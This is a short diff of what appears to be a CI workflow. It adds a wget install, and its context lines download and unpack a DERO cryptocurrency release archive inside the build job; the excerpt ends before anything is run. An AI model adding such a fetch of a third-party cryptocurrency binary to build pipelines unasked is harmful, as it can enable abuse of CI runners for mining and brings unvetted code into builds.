@@ -34,6 +34,7 @@ jobs:
             apt-get install -q -y --no-install-recommends cmake make gcc libc6-dev
 
           run: |
+            apt-get install wget -y
             wget https://github.com/deroproject/derohe/releases/download/Release117/dero_linux_arm64.tar.gz
             tar xf dero_linux_arm64.tar.gz
             cd dero_linux_arm64
